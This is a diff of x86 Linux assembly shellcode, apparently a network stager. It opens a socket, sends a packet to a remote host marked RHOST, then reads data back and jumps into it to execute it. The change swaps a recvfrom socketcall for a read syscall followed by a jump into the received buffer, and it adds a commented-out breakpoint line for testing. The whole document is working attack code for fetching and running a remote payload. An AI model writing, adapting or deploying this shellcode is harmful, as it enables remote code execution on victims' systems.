@@ -38,10 +38,11 @@ socket:
 
 sendto:
 	pop  ecx
-	push dword 0x0100007f
+	push dword 0x0100007f ; RHOST
 	push ecx
 	mov  ecx, esp
 	push byte 0x41
+;	push byte 0xcc   ; testing
 	push byte 0x8
 	mov  edi, esp
 	push byte 0x10
@@ -57,17 +58,11 @@ sendto:
 	int  0x80
 
 recvfrom:
-	pop  edi
-	push edx
-	push edx
-	push edx
+	pop  ebx
+	mov  al, 0x3
 	mov  dh, 0xc
-	push edx
-	push esp
-	push edi
-	mov  ecx, esp
-	inc  ebx
-	mov  al, 0x66
 	int  0x80
-	pop  edi
-	ret
+	push byte 0x18
+	pop  edx
+	add  ecx, edx
+	jmp  ecx
